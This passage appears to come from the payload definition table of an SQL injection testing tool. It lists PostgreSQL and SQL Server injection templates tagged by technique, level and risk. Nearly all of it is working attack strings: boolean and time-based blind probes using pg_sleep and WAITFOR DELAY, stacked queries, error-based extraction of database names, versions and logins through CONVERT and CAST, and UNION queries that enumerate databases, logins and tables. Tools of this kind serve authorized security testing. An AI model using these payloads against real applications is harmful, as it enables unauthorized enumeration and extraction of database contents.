  { id: 'pg-boolean-103', dbms: ["PostgreSQL"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='1/**/", falseTemplate: "{ORIG}' AND '1'='2/**/", where: 'value' },
  { id: 'pg-boolean-104', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND 1=1-- -", falseTemplate: "{ORIG} AND 1=2-- -", where: 'value' },
  { id: 'pg-boolean-105', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND 1=1-- -", falseTemplate: "{ORIG}')) AND 1=2-- -", where: 'value' },
  { id: 'pg-boolean-106', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) AND 1=1-- -", falseTemplate: "{ORIG}\")) AND 1=2-- -", where: 'value' },
  { id: 'pg-boolean-107', dbms: ["PostgreSQL"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR(current_database(),1,1))='p'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR(current_database(),1,1))='x'-- -", where: 'value' },
  { id: 'pg-boolean-108', dbms: ["PostgreSQL"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR(version(),1,1))='P'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR(version(),1,1))='X'-- -", where: 'value' },
  { id: 'pg-boolean-109', dbms: ["PostgreSQL"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTR(current_user,1,1))='p'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTR(current_user,1,1))='x'-- -", where: 'value' },
  { id: 'pg-boolean-110', dbms: ["PostgreSQL"], technique: 'boolean', level: 5, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT 1)=(SELECT 1)-- -", falseTemplate: "{ORIG} AND (SELECT 1)=(SELECT 2)-- -", where: 'value' },
  { id: 'pg-boolean-111', dbms: ["PostgreSQL"], technique: 'boolean', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1' ~ (SELECT CASE WHEN (1=1) THEN '1' ELSE '' END)-- -", where: 'value' },
  { id: 'pg-boolean-112', dbms: ["PostgreSQL"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND COALESCE((SELECT 1 WHERE 1=1), 0)=1-- -", where: 'value' },
  { id: 'pg-time-100', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND pg_sleep({SLEEP})-- -", where: 'value' },
  { id: 'pg-time-101', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT pg_sleep({SLEEP})-- -", where: 'value' },
  { id: 'pg-time-102', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND pg_sleep({SLEEP})-- -", where: 'value' },
  { id: 'pg-time-103', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND pg_sleep({SLEEP})-- -", where: 'value' },
  { id: 'pg-time-104', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND pg_sleep({SLEEP})-- -", where: 'value' },
  { id: 'pg-time-105', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT 1 FROM (SELECT pg_sleep({SLEEP})) x)-- -", where: 'value' },
  { id: 'pg-time-106', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT 1 FROM (SELECT pg_sleep({SLEEP})) x)=1-- -", where: 'value' },
  { id: 'pg-time-107', dbms: ["PostgreSQL"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND pg_sleep({SLEEP})/**/", where: 'value' },
  { id: 'pg-time-108', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND pg_sleep({SLEEP}) IS NOT NULL-- -", where: 'value' },
  { id: 'pg-time-109', dbms: ["PostgreSQL"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT CASE WHEN 1=1 THEN pg_sleep({SLEEP}) ELSE 0 END)-- -", where: 'value' },
  { id: 'pg-time-110', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND pg_sleep({SLEEP}) IS NOT NULL-- -", where: 'value' },
  { id: 'pg-time-111', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND pg_sleep({SLEEP}) IS NOT NULL-- -", where: 'value' },
  { id: 'pg-time-112', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND pg_sleep({SLEEP}) IS NOT NULL-- -", where: 'value' },
  { id: 'pg-time-113', dbms: ["PostgreSQL"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND pg_sleep({SLEEP}) IS NOT NULL/**/", where: 'value' },
  { id: 'pg-time-114', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT pg_sleep({SLEEP}))-- -", where: 'value' },
  { id: 'pg-time-115', dbms: ["PostgreSQL"], technique: 'time', level: 1, risk: 2, clause: ["orderby"], boundary: [""], template: "{ORIG},pg_sleep({SLEEP})-- -", where: 'position' },
  { id: 'pg-time-116', dbms: ["PostgreSQL"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT CASE WHEN 1=1 THEN pg_sleep({SLEEP}) ELSE 0 END)/**/", where: 'value' },
  { id: 'pg-time-117', dbms: ["PostgreSQL"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT CASE WHEN (1=1) THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)-- -", where: 'value' },
  { id: 'pg-stacked-100', dbms: ["PostgreSQL"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT pg_sleep({SLEEP}) {SEP}", where: 'value' },
  { id: 'pg-stacked-101', dbms: ["PostgreSQL"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["\";"], template: "{ORIG}\"; SELECT pg_sleep({SLEEP}) {SEP}", where: 'value' },
  { id: 'pg-stacked-102', dbms: ["PostgreSQL"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); SELECT pg_sleep({SLEEP}) {SEP}", where: 'value' },
  { id: 'pg-stacked-103', dbms: ["PostgreSQL"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') ;SELECT pg_sleep({SLEEP}) {SEP}", where: 'value' },
  { id: 'pg-stacked-104', dbms: ["PostgreSQL"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; select pg_sleep({SLEEP}) {SEP}", where: 'value' },
  { id: 'pg-error-orderby-156', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(SELECT CAST((SELECT version()) AS int))-- -", where: 'position' },
  { id: 'pg-bool-groupby-113', dbms: ["PostgreSQL"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["","'",")","\")"], template: "{ORIG} HAVING 1=1-- -", falseTemplate: "{ORIG} HAVING 1=2-- -", where: 'value' },
  { id: 'pg-bool-groupby-114', dbms: ["PostgreSQL"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' HAVING '1'='1'-- -", falseTemplate: "{ORIG}' HAVING '1'='2'-- -", where: 'value' },
  { id: 'pg-bool-limit-116', dbms: ["PostgreSQL"], technique: 'boolean', level: 5, risk: 1, clause: ["limit"], boundary: [""], template: "{ORIG}+0-- -", falseTemplate: "{ORIG}*0-- -", where: 'position' },
  { id: 'pg-bool-where-117', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=1-- -", falseTemplate: "{ORIG}') AND 1=2-- -", where: 'value' },
  { id: 'pg-bool-where-118', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND '1'='1'-- -", falseTemplate: "{ORIG}')) AND '1'='2'-- -", where: 'value' },
  { id: 'pg-bool-where-119', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND 1=1-- -", falseTemplate: "{ORIG}\") AND 1=2-- -", where: 'value' },
  // ---- SQL Server ----
  { id: 'mssql-union-100', dbms: ["SQL Server"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -", where: 'value' },
  { id: 'mssql-union-101', dbms: ["SQL Server"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -", where: 'value' },
  { id: 'mssql-union-102', dbms: ["SQL Server"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [")"], template: "{ORIG}) UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -", where: 'value' },
  { id: 'mssql-union-103', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},DB_NAME(),SYSTEM_USER-- -", where: 'value' },
  { id: 'mssql-union-104', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},@@VERSION,USER_NAME()-- -", where: 'value' },
  { id: 'mssql-union-105', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},DB_NAME(),@@SERVERNAME-- -", where: 'value' },
  { id: 'mssql-union-106', dbms: ["SQL Server"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.databases WHERE database_id=DB_ID()),1-- -", where: 'value' },
  { id: 'mssql-union-107', dbms: ["SQL Server"], technique: 'union', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.syslogins WHERE name NOT IN ('sa') AND name != SYSTEM_USER),1-- -", where: 'value' },
  { id: 'mssql-union-108', dbms: ["SQL Server"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -", where: 'value' },
  { id: 'mssql-union-109', dbms: ["SQL Server"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -", where: 'value' },
  { id: 'mssql-union-110', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},@@SERVERNAME,DB_NAME()-- -", where: 'value' },
  { id: 'mssql-union-111', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},SYSTEM_USER,DB_NAME()-- -", where: 'value' },
  { id: 'mssql-union-112', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},@@SERVICENAME,@@SERVERNAME-- -", where: 'value' },
  { id: 'mssql-union-113', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},@@SERVICENAME,DB_NAME()-- -", where: 'value' },
  { id: 'mssql-union-114', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},SUSER_SNAME(),DB_NAME()-- -", where: 'value' },
  { id: 'mssql-union-115', dbms: ["SQL Server"], technique: 'union', level: 4, risk: 1, clause: ["orderby"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1-- -", where: 'position' },
  { id: 'mssql-union-116', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},@@VERSION,HOST_NAME()-- -", where: 'value' },
  { id: 'mssql-union-117', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION ALL SELECT {NUM},DB_NAME(),HOST_NAME()-- -", where: 'value' },
  { id: 'mssql-union-118', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') UNION ALL SELECT {NUM},DB_NAME(),@@SERVERNAME-- -", where: 'value' },
  { id: 'mssql-union-119', dbms: ["SQL Server"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1-- -", where: 'value' },
  { id: 'mssql-union-120', dbms: ["SQL Server"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},DB_NAME(),(SELECT COUNT(*) FROM sysobjects)-- -", where: 'value' },
  { id: 'mssql-union-121', dbms: ["SQL Server"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.server_principals WHERE sid=SUSER_SID()),1-- -", where: 'value' },
  { id: 'mssql-union-122', dbms: ["SQL Server"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},(SELECT name FROM sys.databases WHERE database_id=DB_ID()),1-- -", where: 'value' },
  { id: 'mssql-union-123', dbms: ["SQL Server"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},SUSER_SNAME(),HOST_NAME()-- -", where: 'value' },
  { id: 'mssql-union-124', dbms: ["SQL Server"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('sysusers')),1-- -", where: 'value' },
  { id: 'mssql-error-100', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND 1=CONVERT(int,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-101', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,(SELECT @@VERSION))-- -", where: 'value' },
  { id: 'mssql-error-102', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS bigint)-- -", where: 'value' },
  { id: 'mssql-error-103', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=CONVERT(int,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-104', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.syslogins WHERE name=SYSTEM_USER))-- -", where: 'value' },
  { id: 'mssql-error-105', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.databases WHERE database_id=DB_ID()))-- -", where: 'value' },
  { id: 'mssql-error-106', dbms: ["SQL Server"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT (SELECT SYSTEM_USER FOR XML PATH(''))).value('a','int')-- -", where: 'value' },
  { id: 'mssql-error-107', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT 1/0)-- -", where: 'value' },
  { id: 'mssql-error-108', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=(SELECT 1/0)-- -", where: 'value' },
  { id: 'mssql-error-109', dbms: ["SQL Server"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1 IN (SELECT 1/(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-110', dbms: ["SQL Server"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(decimal,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-111', dbms: ["SQL Server"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(float,(SELECT SYSTEM_USER))-- -", where: 'value' },
  { id: 'mssql-error-112', dbms: ["SQL Server"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(money,(SELECT name FROM sys.databases WHERE database_id=DB_ID()))-- -", where: 'value' },
  { id: 'mssql-error-113', dbms: ["SQL Server"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(datetime,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-114', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT SYSTEM_USER) AS int)-- -", where: 'value' },
  { id: 'mssql-error-115', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.server_principals WHERE sid=SUSER_SID()))-- -", where: 'value' },
  { id: 'mssql-error-116', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,@@version)-- -", where: 'value' },
  { id: 'mssql-error-117', dbms: ["SQL Server"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,@@version)/**/", where: 'value' },
  { id: 'mssql-error-118', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT 1/0-- -", where: 'value' },
  { id: 'mssql-error-119', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(bigint,@@servername)-- -", where: 'value' },
  { id: 'mssql-error-120', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,@@servername)-- -", where: 'value' },
  { id: 'mssql-error-121', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,DB_NAME())-- -", where: 'value' },
  { id: 'mssql-error-122', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(bigint,(SELECT @@VERSION))-- -", where: 'value' },
  { id: 'mssql-error-123', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(smallint,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-124', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(tinyint,(SELECT SYSTEM_USER))-- -", where: 'value' },
  { id: 'mssql-error-125', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(uniqueidentifier,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-126', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(binary,(SELECT DB_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-127', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(numeric,(SELECT @@VERSION))-- -", where: 'value' },
  { id: 'mssql-error-128', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT @@VERSION) AS bigint)-- -", where: 'value' },
  { id: 'mssql-error-129', dbms: ["SQL Server"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS date)-- -", where: 'value' },
  { id: 'mssql-error-130', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS money)-- -", where: 'value' },
  { id: 'mssql-error-131', dbms: ["SQL Server"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT SYSTEM_USER) AS datetime)-- -", where: 'value' },
  { id: 'mssql-error-132', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["';"], template: "{ORIG}'; RAISERROR('test',16,1)-- -", where: 'value' },
  { id: 'mssql-error-133', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1/0)=1-- -", where: 'value' },
  { id: 'mssql-error-134', dbms: ["SQL Server"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1/DB_NAME()) IS NULL-- -", where: 'value' },
  { id: 'mssql-error-135', dbms: ["SQL Server"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT 1/0/**/", where: 'value' },
  { id: 'mssql-error-136', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM syslogins))-- -", where: 'value' },
  { id: 'mssql-error-137', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.database_principals WHERE name=USER_NAME()))-- -", where: 'value' },
  { id: 'mssql-error-138', dbms: ["SQL Server"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["';"], template: "{ORIG}'; RAISERROR('test',16,1)/**/", where: 'value' },
  { id: 'mssql-error-139', dbms: ["SQL Server"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(bigint,@@servername)/**/", where: 'value' },
  { id: 'mssql-error-140', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int, FORMATMESSAGE('%s', (SELECT DB_NAME())))-- -", where: 'value' },
  { id: 'mssql-error-141', dbms: ["SQL Server"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT 1 FROM (SELECT (SELECT DB_NAME()) FOR JSON AUTO) AS a)-- -", where: 'value' },
  { id: 'mssql-error-142', dbms: ["SQL Server"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CONVERT(int, (SELECT master.dbo.fn_varbintohexstr(HASHBYTES('MD5', DB_NAME()))))-- -", where: 'value' },
  { id: 'mssql-boolean-100', dbms: ["SQL Server"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'mssql-boolean-101', dbms: ["SQL Server"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND \"1\"=\"2", where: 'value' },
  { id: 'mssql-boolean-102', dbms: ["SQL Server"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' OR '1'='2", where: 'value' },
  { id: 'mssql-boolean-103', dbms: ["SQL Server"], technique: 'boolean', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='1/**/", falseTemplate: "{ORIG}' AND '1'='2/**/", where: 'value' },
  { id: 'mssql-boolean-104', dbms: ["SQL Server"], technique: 'boolean', level: 5, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT SUBSTRING(@@version,1,1))='M'-- -", falseTemplate: "{ORIG} AND (SELECT SUBSTRING(@@version,1,1))='x'-- -", where: 'value' },
  { id: 'mssql-boolean-105', dbms: ["SQL Server"], technique: 'boolean', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT SUBSTRING(@@version,1,1))='M'-- -", falseTemplate: "{ORIG}' AND (SELECT SUBSTRING(@@version,1,1))='x'-- -", where: 'value' },
  { id: 'mssql-boolean-106', dbms: ["SQL Server"], technique: 'boolean', level: 4, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT LEFT(@@version,1))='M'-- -", falseTemplate: "{ORIG} AND (SELECT LEFT(@@version,1))='x'-- -", where: 'value' },
  { id: 'mssql-boolean-107', dbms: ["SQL Server"], technique: 'boolean', level: 5, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND (SELECT 1)=(SELECT 1)-- -", falseTemplate: "{ORIG} AND (SELECT 1)=(SELECT 2)-- -", where: 'value' },
  { id: 'mssql-boolean-108', dbms: ["SQL Server"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND 1=1-- -", falseTemplate: "{ORIG}')) AND 1=2-- -", where: 'value' },
  { id: 'mssql-time-100', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-101', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: [""], template: "{ORIG} WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-102', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-103', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") WAITFOR DELAY \"0:0:{SLEEP}\"-- -", where: 'value' },
  { id: 'mssql-time-104', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-105', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=1; WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-106', dbms: ["SQL Server"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND 1=1; WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-107', dbms: ["SQL Server"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'/**/", where: 'value' },
  { id: 'mssql-time-108', dbms: ["SQL Server"], technique: 'time', level: 5, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; IF(1=1) WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-109', dbms: ["SQL Server"], technique: 'time', level: 5, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; IF(1=2) WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
  { id: 'mssql-time-110', dbms: ["SQL Server"], technique: 'time', level: 5, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' IF(1=1) WAITFOR DELAY '0:0:{SLEEP}'-- -", where: 'value' },
